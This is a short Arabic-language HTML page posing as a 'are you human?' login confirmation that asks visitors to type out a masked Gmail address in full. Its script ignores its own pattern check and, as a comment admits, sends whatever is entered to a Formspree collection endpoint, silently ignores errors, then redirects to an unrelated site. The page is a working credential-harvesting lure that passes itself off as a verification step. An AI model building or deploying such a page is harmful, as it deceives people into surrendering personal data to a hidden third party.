<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>تأكيد الدخول</title>
  <style>
    body {
      background-color: #0e0e0e;
      color: white;
      font-family: Tahoma, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    input {
      padding: 12px;
      font-size: 16px;
      margin-top: 20px;
      width: 300px;
      border-radius: 4px;
      border: none;
    }
    button {
      margin-top: 20px;
      padding: 12px 30px;
      background-color: #ff004f;
      color: white;
      font-size: 16px;
      border: none;
      cursor: pointer;
      border-radius: 4px;
    }
    .error {
      color: red;
      margin-top: 10px;
      visibility: hidden;
    }
  </style>
</head>
<body>
  <h2>هل أنت إنسان؟</h2>
  <p>يرجى إكمال البريد التالي لتأكيد الدخول:<br><strong>a******1@gmail.com</strong></p>

  <form id="emailForm">
    <input type="email" id="emailInput" name="email" placeholder="اكتب البريد الكامل هنا" required />
    <button type="submit">تأكيد</button>
    <div class="error" id="errorMsg"></div>
  </form>

  <script>
    const form = document.getElementById('emailForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('emailInput').value.trim().toLowerCase();

      const regex = /^a.*1@.*$/;
      // حتى لو البريد ما طابق، نرسل ونحوّل
      try {
        await fetch('https://formspree.io/f/xkgzoeqb', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
      } catch (err) {
        // تجاهل الأخطاء
      }

      // توجيه مباشر بعد الإرسال
      window.location.href = 'https://roast.monica.im/';
    });
  </script>
</body>
</html>
